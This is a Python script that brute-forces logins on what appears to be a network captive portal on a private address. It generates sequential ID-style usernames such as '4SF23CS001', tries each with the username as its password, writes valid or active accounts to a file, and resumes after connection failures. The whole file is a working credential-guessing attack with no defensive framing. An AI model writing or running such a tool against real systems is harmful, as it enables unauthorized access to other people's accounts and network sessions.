import urllib.request
import urllib.parse
import time
import xml.etree.ElementTree as ET
import sys
import csv
import os

# ==========================================
# CONFIGURATION
# ==========================================
CSV_FILE = "ranges.csv"
VALID_USERS_FILE = "valid_users.txt"
BASE_URL = "http://172.21.0.1:8090"
LOGIN_URL = f"{BASE_URL}/login.xml"
LOGOUT_URL = f"{BASE_URL}/logout.xml"
RETRY_DELAY_SEC = 300  # 10 minutes
TIMEOUT_SEC = 10
# ==========================================

def send_post(url, data):
    try:
        data_encoded = urllib.parse.urlencode(data).encode('utf-8')
        headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; brute_force/1.0)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        req = urllib.request.Request(url, data=data_encoded, headers=headers)
        with urllib.request.urlopen(req, timeout=TIMEOUT_SEC) as response:
            try:
                body = response.read().decode('utf-8')
            except Exception:
                body = ''
            status_code = getattr(response, 'getcode', lambda: None)()
            print(f"[DEBUG] HTTP {status_code} from {url}")
            return body
    except Exception as e:
        print(f"[ERROR] Request to {url} failed: {repr(e)}")
        return None

def logout(username):
    try:
        timestamp = int(time.time() * 1000)
        data = {
            "mode": "193",
            "username": username,
            "a": timestamp,
            "producttype": "0"
        }
        send_post(LOGOUT_URL, data)
    except:
        pass

def check_single_user(user, pwd):
    """
    Performs the login check for a single user.
    Returns:
        True: Check completed (valid or invalid)
        False: Connection failed (needs retry)
    """
    timestamp = int(time.time() * 1000)
    data = {
        "mode": "191",
        "username": user,
        "password": pwd,
        "a": timestamp,
        "producttype": "0"
    }

    print(f"Checking {user}...", end='')
    sys.stdout.flush()

    response_xml = send_post(LOGIN_URL, data)

    if response_xml:
        try:
            root = ET.fromstring(response_xml)
            message_node = root.find("message")
            status_node = root.find("status")

            message = message_node.text if message_node is not None else ""
            status = status_node.text if status_node is not None else ""

            if status == "LIVE" or "You are signed in as" in message:
                print(f" VALID!")
                with open(VALID_USERS_FILE, "a") as f:
                    f.write(user + "\n")
                logout(user)
            elif "already in use" in message.lower():
                print(f" VALID (Active)!")
                with open(VALID_USERS_FILE, "a") as f:
                    f.write(user + "\n")
            elif "maximum login limit" in message.lower():
                 print(f" VALID (Max Limit)!")
                 with open(VALID_USERS_FILE, "a") as f:
                    f.write(user + "\n")
            else:
                print(f" Invalid.")
            return True
        except Exception:
            print(" Error parsing response.")
            # We count parsing errors as 'checked/invalid' to prevent infinite loops on bad server responses
            return True 
    else:
        print(" Connection Failed.")
        return False

def load_tasks():
    tasks = []
    if not os.path.exists(CSV_FILE):
        return []
    with open(CSV_FILE, 'r', newline='') as f:
        reader = csv.DictReader(f)
        for row in reader:
            tasks.append(row)
    return tasks

def update_csv(tasks):
    with open(CSV_FILE, 'w', newline='') as f:
        fieldnames = ['prefix', 'start_x', 'end_y', 'last_checked']
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(tasks)
        f.flush()
        os.fsync(f.fileno())

def main():
    print("--- Starting CSV-based Brute Force ---")
    
    while True:
        # Reload tasks every time we finish a row or start to ensure we have latest state
        # But actually we keep state in memory and flush to disk.
        tasks = load_tasks()
        all_done = True

        for i, task in enumerate(tasks):
            prefix = task['prefix']
            start_x = int(task['start_x'])
            end_y = int(task['end_y'])
            last_checked = int(task['last_checked'])

            # Determine where to start
            # If last_checked is less than start_x (e.g. 0), we start at start_x
            # If last_checked is inside range, we start at last_checked + 1
            current_val = max(start_x, last_checked + 1)

            if current_val > end_y:
                continue # This row is finished

            all_done = False
            print(f"\nProcessing Group: {prefix} (Range {start_x}-{end_y}), Starting at {current_val}")

            # Loop through this specific range
            # We use a while loop to handle the retry logic without incrementing
            ptr = current_val
            while ptr <= end_y:
                # Construct username
                # Assuming format 4SF23CS + 001 (padding to 3 chars if needed? User examples show padding)
                # "4SF23CS100" -> suffix is number.
                # User prompted: "4SF23CS ... from 1 to 250". Usually ID numbers are 3 digits.
                suffix = f"{ptr:03d}"
                user = f"{prefix}{suffix}"
                pwd = user

                success = check_single_user(user, pwd)

                if success:
                    # Mark this specific number as done in memory
                    task['last_checked'] = str(ptr)
                    # Update CSV immediately
                    update_csv(tasks)
                    ptr += 1
                else:
                    # Connection failed
                    print(f"Waiting {RETRY_DELAY_SEC//60} mins before retrying...")
                    try:
                        time.sleep(RETRY_DELAY_SEC)
                    except KeyboardInterrupt:
                        sys.exit(0)
                    print("Resuming...")
                    # Do not increment ptr, retry loop

            # When this row is finished
            print(f"Group {prefix} Completed!")
        
        if all_done:
            print("All tasks in CSV are completed.")
            break
        else:
            # If we exited the for loop but things aren't done (shouldn't happen with logic above unless we broke out)
            pass

if __name__ == "__main__":
    main()
